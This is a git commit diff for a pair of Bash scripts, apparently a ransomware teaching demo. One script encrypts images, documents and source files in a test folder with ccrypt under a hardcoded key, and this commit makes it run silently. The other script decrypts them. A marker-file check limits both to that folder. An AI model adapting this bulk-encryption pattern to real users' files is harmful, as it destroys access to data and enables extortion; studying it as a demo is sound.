532e6ea4acd54b37d24c250a9c57516508dbc65c
David R <egoz3ntrum@gmail.com>
2021-11-07 22:38:56 +0100

    security check added

--- parodellorar.sh
+++ parodellorar.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
-
-
+KEY=cybersec42
 FOLDER="${PWD}"/test
 
 if [ ! -e "${FOLDER}"/.quierollorar ]; then
@@ -11,5 +10,5 @@ FILES=$(find "${FOLDER}" -type f -name *.cpt)
 for file in $FILES;
 do
 	echo Decrypting "${file}"
-	ccrypt -d "${file}" -K cybersec42
+	ccrypt -d "${file}" -K $KEY
 done;
--- quierollorar.sh
+++ quierollorar.sh
@@ -1,12 +1,15 @@
 #!/bin/bash
-
+KEY=cybersec42
 FOLDER="${PWD}"/test
-echo $FOLDER
+
+# Security check: if the file .quierollorar doesn't exist, exit.
 if [ ! -e "${FOLDER}"/.quierollorar ]; then
 	exit
 fi
-FILES=$(find "${FOLDER}" -regextype posix-egrep -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt)")
+
+# Find all files with specific extension
+FILES=$(find "${FOLDER}" -regextype posix-egrep -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt|c|cpp)")
 for file in $FILES;
 do
-	ccrypt -e "${file}" -K cybersec42
+	ccrypt -e "${file}" -K $KEY &>/dev/null
 done;
